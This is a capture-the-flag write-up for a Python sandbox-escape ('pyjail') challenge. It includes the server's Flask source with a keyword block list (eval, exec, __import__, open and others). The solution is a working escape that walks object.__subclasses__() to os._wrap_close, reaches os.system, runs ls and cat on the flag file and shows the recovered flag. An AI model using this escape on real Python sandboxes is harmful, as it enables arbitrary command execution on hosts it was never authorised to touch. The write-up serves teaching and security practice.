# Outdated

> I found this old website that runs your python code, but the security hasn't been updated in years
> I'm sure there's a flag floating around, can you find it?

> You can run python code from anywhere! Upload code from your phone! (Note: code cannot import libraries or use some keywords. Please stop trying to.)

This is a basic pyjail challenge. Imports and certain keywords are blocked. The source code of the server is provided, so we can see what exactly is allowed.

Notably:
```python
# app.py
blocked = ["__import__", "globals", "locals", "__builtins__", "dir", "eval", "exec", "breakpoint", "callable", "classmethod", "compile", "staticmethod", "sys", "__importlib__", "delattr", "getattr", "setattr", "hasattr", "sys", "open"]
```

There are a few other checks, including one that blocks non-ASCII characters, and a limit on the number of lines in the file.

<details>
<summary>Full `app.py`</summary>
    
``` python
from flask import Flask, request, render_template, redirect
from ast import parse
import re
import subprocess
import uuid

app = Flask(__name__)
app.static_folder = 'static'
app.config['UPLOAD_FOLDER'] = './uploads'

@app.route('/')
def index():
    return render_template('home.html')

@app.route('/upload')
def upload():
    return render_template('index.html')

@app.route('/submit', methods=['GET', 'POST'])
def submit():
    if 'file' not in request.files:
        return redirect('/')
    f = request.files['file']
    fname = f"uploads/{uuid.uuid4()}.py"
    f.save(fname)
    code_to_test = re.sub(r'\\\s*\n\s*', '', open(fname).read().strip())
    if not code_to_test:
        return redirect('/')
    tested = test_code(code_to_test)
    if tested[0]:
        res = ''
        try:
            ps = subprocess.run(['python', fname], timeout=5, capture_output=True, text=True)
            res = ps.stdout
        except:
            res = 'code timout'
        return render_template('submit.html', code=code_to_test.split('\n'), text=res.strip().split('\n'))
    else:
        return render_template('submit.html', code=code_to_test.split('\n'), text=[tested[1]])

@app.route('/static/<path:path>')
def static_file(filename):
    return app.send_static_file(filename)

def test_for_non_ascii(code):
    return any(not (0 < ord(c) < 127) for c in code)

def test_for_imports(code):
    cleaned = clean_comments_and_strings(code)
    return 'import ' in cleaned

def test_for_invalid(code):
    if len(code) > 1000:
        return True
    try:
        parse(code)
    except:
        return True
    return False

blocked = ["__import__", "globals", "locals", "__builtins__", "dir", "eval", "exec",
        "breakpoint", "callable", "classmethod", "compile", "staticmethod", "sys",
        "__importlib__", "delattr", "getattr", "setattr", "hasattr", "sys", "open"]

blocked_regex = re.compile(fr'({"|".join(blocked)})(?![a-zA-Z0-9_])')

def test_for_disallowed(code):
    code = clean_comments_and_strings(code)
    return blocked_regex.search(code) is not None

def test_code(code):
    if test_for_non_ascii(code):
        return (False, 'found a non-ascii character')
    elif test_for_invalid(code):
        return (False, 'code too long or not parseable')
    elif test_for_imports(code):
        return (False, 'found an import')
    elif test_for_disallowed(code):
        return (False, 'found an invalid keyword')
    return (True, '')

def clean_comments_and_strings(code):
    code = re.sub(r'[rfb]*("""|\'\'\').*?\1', '', code,
                  flags=re.S)
    lines, res = code.split('\n'), ''
    for line in lines:
        line = re.sub(r'[rfb]*("|\')(.*?(?!\\).)?\1',
                      '', line)
        if '#' in line:
            line = line.split('#')[0]
        if not re.fullmatch(r'\s*', line):
          res += line + '\n'
    return res.strip()

if __name__ == '__main__':
    app.run(debug=True)
```
</details>

Sidenote: when I was solving this challenge I didn't realize the source code was provided, which didn't make a big difference but did lead to me wasting some time experimenting with which keywords were blocked.

## Solution

Most of the obvious solutions are prevented by the blocked keywords, and lack of imports. 

I started by printing out all of the subclasses of `object` to see what classes I had access to:
``` python
print(object.__subclasses__())
```

This returned a long list of classes to look through. I ended up just `CMD+F`ing for `os` to try to find any classes of interest, and the only result was `os._wrap_close`.

I tried googling this class since I had no idea was it was, but surprisingly I found absolutely zero information about it, so I'm still not sure what it really is. However I did find [one useful page](https://blog.p6.is/Python-SSTI-exploitable-classes/) detailing how it could be exploited.

From that page:
``` python
[].__class__.__mro__[1].__subclasses__()[127].__init__.__globals__['system']('ls')
```

It looks like the initializer for `os._wrap_close` has a reference to the `system` function, which can be used to execute shell commands!

We just need to grab that class from the list we got earlier, and then we can use the `ls` command to look around the file system:
``` python
print([x for x in object.__subclasses__() if x.__name__ == "_wrap_close"][0].__init__.__globals__['system']('ls'))
```

```
Dockerfile
__pycache__
app.py
flag-b5a31b65-07a2-479c-bed4-f371a9bbdd1d.txt
run.sh
static
templates
uploads
```

There's the flag!

Read the file with `cat`:
``` python
print([x for x in object.__subclasses__() if x.__name__ == "_wrap_close"][0].__init__.__globals__['system']('cat flag-b5a31b65-07a2-479c-bed4-f371a9bbdd1d.txt'))
```

And we get the flag:
```
tjctf{oops_bad_filter_3b582f74}
```
